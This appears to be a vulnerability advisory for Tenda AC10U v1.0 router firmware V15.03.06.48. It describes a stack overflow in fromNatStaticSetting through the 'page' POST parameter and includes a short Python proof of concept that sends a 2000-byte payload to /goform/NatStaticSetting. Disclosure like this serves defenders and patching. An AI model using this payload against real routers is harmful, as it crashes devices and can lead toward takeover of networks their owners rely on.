## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware V15.03.06.48

## Vulnerability details

The Tenda AC10U v1.0 Firmware V15.03.06.48 firmware has a stack overflow vulnerability in the `fromNatStaticSetting` function. The `page` variable receives the `page` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `page` can trigger this security vulnerability.

![image-20240313220712459](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313220712459.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/NatStaticSetting"
payload = b"a"*2000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313220739140](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313220739140.png)
